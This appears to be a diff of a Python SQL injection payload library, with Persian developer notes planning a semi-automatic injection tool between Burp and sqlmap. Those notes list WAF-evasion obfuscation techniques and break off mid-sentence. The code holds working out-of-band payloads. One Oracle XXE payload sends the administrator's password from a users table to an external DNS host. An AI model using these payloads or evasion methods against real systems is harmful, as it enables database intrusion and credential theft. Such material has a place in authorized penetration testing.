@@ -131,19 +131,6 @@ oast = {
     "SQLite": """' UNION SELECT 1 WHERE load_extension('\{DNS}\a')--"""
 }
 
-اول از همه یک لیست از تمام مواردی که باعث میشه در waf به مشکل بخوریم بده و همه دیتا بیس ها رو در نظر بگیر
-
-بعد میخوام که ابزارم ازم بپرسه که چه مدل دیتا بیسی رو میخوام Obfuscation کنم
-چون مدل Obfuscation کردن در هر دیتابیس فرق میکنه
-
-Case change
-Inline comments
-Hex / Char encoding
-Unicode / XML entities
-String concatenation
-Extra parentheses / operators
-Alternative keywords
-Whitespace tricks
 
 oast_pay = {
     "Oracle": """' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT password FROM users WHERE username='administrator')||'.{DNS}/"> %remote;]>'),'/l') FROM dual--""",
@@ -253,3 +240,21 @@ blind_sql_time_based = {
 # }
 
 
+
+اول از همه یک لیست از تمام مواردی که باعث میشه در waf به مشکل بخوریم بده و همه دیتا بیس ها رو در نظر بگیر
+
+بعد میخوام که ابزارم ازم بپرسه که چه مدل دیتا بیسی رو میخوام Obfuscation کنم
+چون مدل Obfuscation کردن در هر دیتابیس فرق میکنه
+
+Case change
+Inline comments
+Hex / Char encoding
+Unicode / XML entities
+String concatenation
+Extra parentheses / operators
+Alternative keywords
+Whitespace tricks
+
+هدف من اینه که یک ابزار نیمه خودکار باشه 
+نه مثل burp خیلی دستی و نه مثل sqlmap خیلی اتومات و فقط بخش های لازم برای سرعت دادن به تست اتومات بهشن تا حدی
+در مرحله بعدی میخوام که 
